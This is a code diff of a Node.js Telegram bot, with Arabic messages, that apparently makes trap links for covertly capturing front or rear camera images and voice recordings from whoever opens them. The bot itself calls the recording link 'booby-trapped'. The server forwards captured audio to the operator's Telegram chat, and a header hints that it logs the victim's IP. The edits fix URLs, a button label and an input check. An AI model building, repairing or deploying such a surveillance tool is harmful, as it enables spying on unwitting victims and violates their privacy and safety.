@@ -80,6 +80,10 @@ IP: ${additionalData.ip}
 });
 
 // Route for voice recording
+app.get('/record', (req, res) => {
+    res.sendFile(path.join(__dirname, 'record.html'));
+});
+
 app.post('/submitVoice', uploadDisk.single('voice'), (req, res) => {
     const chatId = req.body.chatId;
     const voicePath = req.file.path;
@@ -102,10 +106,6 @@ IP: ${additionalData.ip}
     }).catch(error => {
         res.status(500).send('Error sending voice message.');
     });
-});
-
-app.get('/record', (req, res) => {
-    res.sendFile(path.join(__dirname, 'record.html'));
 });
 
 // Handle subscriptions
@@ -143,11 +143,11 @@ bot.onText(/\/listsubscribers/, (msg) => {
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     const message = 'مرحبًا! انقر على الرابط لدخول.';
-    const url = `https://creative-marmalade-periwinkle.glitch.me//${chatId}`;
+    const url = `https://creative-marmalade-periwinkle.glitch.me/${chatId}`;
     bot.sendMessage(chatId, message, {
         reply_markup: {
             inline_keyboard: [
-                [{ text: 'تصوير ام أمامي', url: `${url}?cameraType=front` }],
+                [{ text: 'تصوير كام أمامي', url: `${url}?cameraType=front` }],
                 [{ text: 'تصوير كام خلفي', url: `${url}?cameraType=rear` }],
                 [{ text: 'تسجيل صوت', callback_data: 'select_duration' }]
             ]
@@ -169,9 +169,9 @@ bot.on('message', (msg) => {
     const duration = parseInt(msg.text, 10);
 
     if (!isNaN(duration) && duration > 0 && duration <= 20) {
-        const link = `https://creative-marmalade-periwinkle.glitch.me//record?chatId=${chatId}&duration=${duration}`;
+        const link = `https://creative-marmalade-periwinkle.glitch.me/record?chatId=${chatId}&duration=${duration}`;
         bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
-    } else {
+    } else if (!isNaN(duration)) {
         bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
     }
 });
